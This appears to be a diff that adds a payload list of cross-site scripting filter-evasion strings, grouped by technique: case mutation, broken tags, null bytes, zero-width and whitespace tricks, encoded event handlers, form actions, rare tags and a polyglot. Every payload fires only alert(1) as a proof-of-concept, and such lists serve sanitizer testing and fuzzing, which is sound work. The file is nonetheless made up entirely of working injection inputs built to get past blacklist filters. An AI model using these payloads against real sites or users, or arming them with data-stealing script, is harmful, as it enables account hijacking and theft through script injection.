@@ -1,0 +1,148 @@
+# Filter Evasion Payloads  
+# Advanced techniques to evade input filters and sanitization
+# These payloads exploit weaknesses in pattern matching and blacklist filters
+
+# Case mutation
+<ScRiPt>alert(1)</sCrIpT>
+<SCRIPT>alert(1)</SCRIPT>
+<sCrIpT>alert(1)</ScRiPt>
+<iMg sRc=x oNeRrOr=alert(1)>
+<ImG sRc=x OnErRoR=alert(1)>
+
+# Tag breaking
+<scr<script>ipt>alert(1)</script>
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<<SCRIPT>alert(1);//<</SCRIPT>
+<scr\x00ipt>alert(1)</script>
+
+# Whitespace variations (tabs, newlines, carriage returns)
+<script	>alert(1)</script>
+<script
+>alert(1)</script>
+<img	src=x	onerror=alert(1)>
+<svg
+onload=alert(1)>
+<img src=x	onerror=alert(1)>
+
+# Zero-width characters
+<script>alert(1)</script>
+<img src=x onerror=alert(1)>
+
+# Comment breaking
+<!--><script>alert(1)</script>-->
+<!--><img src=x onerror=alert(1)>-->
+<script><!--</script><script>alert(1)//--></script>
+<script><!--*/alert(1)//--></script>
+
+# Backtick variations
+<img src=`x` onerror=alert(1)>
+<img src='x' onerror=alert(1)>
+<img src="x" onerror=alert(1)>
+<img src=x onerror=`alert(1)`>
+
+# Quote escaping
+<img src=x onerror='alert(1)'>
+<img src=x onerror="alert(1)">
+<img src=x onerror=alert&#40;1&#41;>
+<img src="x" onerror="&#97;lert(1)">
+
+# Attribute breaking
+<img src=x:alert(1) onerror=eval(src)>
+<img src=javascript:alert(1)//x onerror=">//>
+<img src=x onerror=alert`1`>
+
+# Multiple slashes
+<img src=x onerror=alert(1)//>
+<img src=x onerror=alert(1)\\>
+<svg/onload=alert(1)//>
+
+# String concatenation
+<script>al\u0065rt(1)</script>
+<script>eval('al'+'ert(1)')</script>
+<script>eval('al\x65rt(1)')</script>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Nested tags
+<svg><script>alert(1)</script></svg>
+<math><script>alert(1)</script></math>
+<div><script>alert(1)</script></div>
+
+# Incomplete tags
+<img src=x onerror=alert(1)//
+<script>alert(1)//
+<svg onload=alert(1)//
+
+# Null bytes
+<script\x00>alert(1)</script>
+<img\x00src=x\x00onerror=alert(1)>
+<svg\x00onload=alert(1)>
+
+# Rare attributes
+<img src=x:alert(1) onerror=eval(src)>
+<input onfocus=alert(1) autofocus>
+<select onfocus=alert(1) autofocus>
+<textarea onfocus=alert(1) autofocus>
+
+# Event handler obfuscation
+<img src=x onerror=al\u0065rt(1)>
+<img src=x onerror=window['alert'](1)>
+<img src=x onerror=self['alert'](1)>
+<img src=x onerror=top['alert'](1)>
+<img src=x onerror=parent['alert'](1)>
+
+# Newline and carriage return injection
+<img src=x onerror="alert(1)">
+<img src=x onerror="alert(1)">
+
+# Tab injection
+<img	src=x	onerror=alert(1)>
+
+# Multiple spaces
+<img  src=x  onerror=alert(1)>
+<script  >alert(1)</script>
+
+# Mixed quotes and backticks
+<img src=`x` onerror=alert(1)>
+<img src='x' onerror="alert(1)">
+
+# Alternative event names
+<body onpageshow=alert(1)>
+<body onhashchange=alert(1)>
+<body onbeforeunload=alert(1)>
+
+# Form-related bypasses  
+<form><button formaction=javascript:alert(1)>X</button></form>
+<form><input formaction=javascript:alert(1)>
+<form><button formaction=javascript:alert(1)>CLICK</button>
+
+# Polyglot attempts
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
+
+# Comment injection
+<svg><!--</svg><script>alert(1)</script>-->
+<math><!--</math><script>alert(1)</script>-->
+
+# Alternate protocol handlers
+<a href="javascript:alert(1)">click</a>
+<a href="  javascript:alert(1)">click</a>
+<a href="javascript&#58;alert(1)">click</a>
+
+# Use of rare tags
+<marquee onstart=alert(1)>X</marquee>
+<details open ontoggle=alert(1)>
+<meter onmouseover=alert(1)>X</meter>
+
+# Mutation attempts
+<noscript><p title="</noscript><img src=x onerror=alert(1)>">
+
+# Template string injection
+<script>alert`1`</script>
+<img src=x onerror=alert`1`>
+
+# Object property access
+<script>window['al'+'ert'](1)</script>
+<img src=x onerror=window['alert'](1)>
+
+# Combining multiple evasion techniques
+<ScR<script>IpT>alert(1)</ScR</script>IpT>
+<img	src=x	on\u0065rror=alert(1)>
